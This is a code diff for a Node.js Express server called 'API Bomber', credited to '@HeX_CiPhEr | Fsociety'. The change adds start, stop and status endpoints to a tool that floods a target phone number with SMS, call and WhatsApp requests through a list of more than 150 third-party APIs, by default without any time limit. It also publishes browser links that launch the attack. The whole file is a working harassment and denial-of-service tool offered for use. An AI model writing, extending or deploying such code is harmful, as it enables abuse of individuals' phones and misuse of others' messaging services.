@@ -1,4 +1,4 @@
-// API Bomber - Direct Browser Attack
+// API Bomber - Real-Time Count + Stop
 // @HeX_CiPhEr | Fsociety
 
 const express = require('express');
@@ -12,6 +12,7 @@ app.use(express.json());
 // ==================== CONFIG ====================
 const RATE_LIMIT_SECONDS = 10;
 const userLastRequest = {};
+const activeAttacks = {};
 
 // ==================== 150+ APIS ====================
 const APIS = [
@@ -154,16 +155,18 @@ async function sendRequest(api, phone) {
   }
 }
 
-// ==================== MAIN BOMBER (Unlimited) ====================
+// ==================== BOMBER WITH COUNT ====================
 async function runBomber(phone, duration = 0) {
   const startTime = Date.now();
   let smsCount = 0, callCount = 0, whatsappCount = 0, totalSent = 0;
   const formats = getFormats(phone);
   
-  // Run until user stops (duration 0 = unlimited)
   while (true) {
-    // If duration is set and time is up, stop
     if (duration > 0 && (Date.now() - startTime) >= duration * 1000) {
+      break;
+    }
+    // Check if attack was stopped
+    if (activeAttacks[phone] === false) {
       break;
     }
     const api = randomItem(APIS);
@@ -193,14 +196,16 @@ app.get('/', (req, res) => {
   });
 });
 
-// START ATTACK - Direct Browser (UNLIMITED)
+// START ATTACK - Unlimited
 app.get('/start/:phone', async (req, res) => {
   const phone = req.params.phone;
   if (!phone || !phone.match(/^\d{10}$/)) {
     return res.json({ error: 'Invalid phone number. Need 10 digits.' });
   }
   
-  // Rate limit check
+  // Set active attack
+  activeAttacks[phone] = true;
+  
   const now = Date.now();
   if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
     return res.json({ 
@@ -211,7 +216,6 @@ app.get('/start/:phone', async (req, res) => {
   }
   userLastRequest[phone] = now;
   
-  // Start attack (duration 0 = unlimited)
   try {
     const results = await runBomber(phone, 0);
     res.json({
@@ -219,7 +223,7 @@ app.get('/start/:phone', async (req, res) => {
       target: phone,
       duration: 'Unlimited',
       stats: results,
-      note: 'Attack running. Refresh page to stop.'
+      note: 'Attack stopped'
     });
   } catch (error) {
     res.json({ success: false, error: 'Attack failed' });
@@ -233,6 +237,8 @@ app.get('/start/:phone/:duration', async (req, res) => {
   if (!phone || !phone.match(/^\d{10}$/)) {
     return res.json({ error: 'Invalid phone number. Need 10 digits.' });
   }
+  
+  activeAttacks[phone] = true;
   
   const now = Date.now();
   if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
@@ -257,6 +263,32 @@ app.get('/start/:phone/:duration', async (req, res) => {
   }
 });
 
+// STOP ATTACK
+app.get('/stop/:phone', (req, res) => {
+  const phone = req.params.phone;
+  if (!phone || !phone.match(/^\d{10}$/)) {
+    return res.json({ error: 'Invalid phone number. Need 10 digits.' });
+  }
+  
+  if (activeAttacks[phone]) {
+    activeAttacks[phone] = false;
+    if (userLastRequest[phone]) {
+      delete userLastRequest[phone];
+    }
+    res.json({ 
+      success: true, 
+      message: `Attack stopped for ${phone}`,
+      target: phone
+    });
+  } else {
+    res.json({ 
+      success: false, 
+      message: 'No active attack for this number',
+      target: phone
+    });
+  }
+});
+
 // Status endpoint
 app.get('/status/:phone', (req, res) => {
   const phone = req.params.phone;
@@ -266,21 +298,12 @@ app.get('/status/:phone', (req, res) => {
   res.json({
     status: 'ready',
     target: phone,
+    is_active: activeAttacks[phone] || false,
     attack_link: `https://bomber-hex-osint.vercel.app/start/${phone}`,
+    stop_link: `https://bomber-hex-osint.vercel.app/stop/${phone}`,
     duration_link: `https://bomber-hex-osint.vercel.app/start/${phone}/60`,
-    note: 'Open link in browser to start attack'
+    note: 'Open link in browser to start/stop attack'
   });
-});
-
-// Stop attack (by clearing rate limit)
-app.get('/stop/:phone', (req, res) => {
-  const phone = req.params.phone;
-  if (userLastRequest[phone]) {
-    delete userLastRequest[phone];
-    res.json({ success: true, message: `Attack stopped for ${phone}` });
-  } else {
-    res.json({ success: false, message: 'No active attack for this number' });
-  }
 });
 
 module.exports = app;
